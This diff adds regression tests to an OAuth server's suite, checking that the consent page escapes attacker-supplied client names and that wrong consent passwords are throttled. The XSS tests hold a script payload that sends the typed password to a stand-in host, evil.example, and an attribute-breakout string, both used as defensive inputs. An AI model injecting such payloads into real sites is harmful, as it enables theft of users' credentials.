@@ -323,3 +323,97 @@ describe('redirect_uri is matched exactly', () => {
     await res.text();
   }, 30_000);
 });
+
+/**
+ * client_name arrives through the UNAUTHENTICATED /oauth/register endpoint and
+ * is rendered into the consent page. That page is where the human types the
+ * admin password, so unescaped attacker markup there is stored XSS aimed
+ * squarely at the one human secret in the system. escapeHtml is applied - and
+ * nothing tested it, so removing it was invisible.
+ */
+describe('the consent page escapes attacker-supplied text', () => {
+  async function consentPageFor(clientName: string): Promise<string> {
+    const reg = await fetch(`${base}/oauth/register`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ client_name: clientName, redirect_uris: [REDIRECT_URI] }),
+    });
+    const { client_id: clientId } = (await reg.json()) as { client_id: string };
+    const { challenge } = pkce();
+    const page = await fetch(
+      `${base}/oauth/authorize?${new URLSearchParams({
+        client_id: clientId,
+        redirect_uri: REDIRECT_URI,
+        response_type: 'code',
+        code_challenge: challenge,
+        code_challenge_method: 'S256',
+        state: 'xyz',
+        resource: `${issuer}/mcp`,
+      })}`,
+    );
+    expect(page.status).toBe(200);
+    return page.text();
+  }
+
+  it('does not emit a script tag from a client name', async () => {
+    const html = await consentPageFor('<script>fetch("//evil.example?p="+document.forms[0].password.value)</script>');
+
+    expect(html).not.toContain('<script>fetch');
+    // The name is still shown, just inert.
+    expect(html).toContain('&lt;script&gt;');
+  }, 30_000);
+
+  it('does not let a client name break out of the attribute or element', async () => {
+    const html = await consentPageFor('" onmouseover="alert(1)" x="');
+    expect(html).not.toContain('onmouseover="alert(1)"');
+  }, 30_000);
+
+  it('escapes the ampersand and angle brackets rather than dropping them', async () => {
+    const html = await consentPageFor('Tom & Jerry <Ltd>');
+    expect(html).toContain('Tom &amp; Jerry &lt;Ltd&gt;');
+  }, 30_000);
+});
+
+/**
+ * The consent password is the only human secret in the system and the consent
+ * POST is the one place it is checked, which makes it the one place worth
+ * brute forcing. A FixedWindowThrottle(5, 5min) guards it; the existing test
+ * made exactly one wrong attempt, so deleting the throttle passed.
+ */
+describe('the consent password cannot be guessed without limit', () => {
+  it('starts refusing after repeated wrong passwords', async () => {
+    const reg = await fetch(`${base}/oauth/register`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ client_name: 'Throttle', redirect_uris: [REDIRECT_URI] }),
+    });
+    const { client_id: clientId } = (await reg.json()) as { client_id: string };
+
+    let sawThrottled = false;
+    let sawRejected = false;
+    for (let attempt = 0; attempt < 10; attempt += 1) {
+      const { challenge } = pkce();
+      const page = await fetch(
+        `${base}/oauth/authorize?${new URLSearchParams({
+          client_id: clientId,
+          redirect_uri: REDIRECT_URI,
+          response_type: 'code',
+          code_challenge: challenge,
+          code_challenge_method: 'S256',
+          state: 'xyz',
+          resource: `${issuer}/mcp`,
+        })}`,
+      );
+      const requestId = /name="request_id" value="([^"]+)"/.exec(await page.text())?.[1];
+      if (requestId === undefined) break;
+      const res = await form('/oauth/authorize', { request_id: requestId, password: `wrong-${attempt}`, approve: 'yes' });
+      await res.text();
+      if (res.status === 401) sawRejected = true;
+      if (res.status === 429) { sawThrottled = true; break; }
+    }
+
+    expect(sawRejected).toBe(true);
+    // Without a throttle every one of the ten would simply be a 401.
+    expect(sawThrottled).toBe(true);
+  }, 60_000);
+});
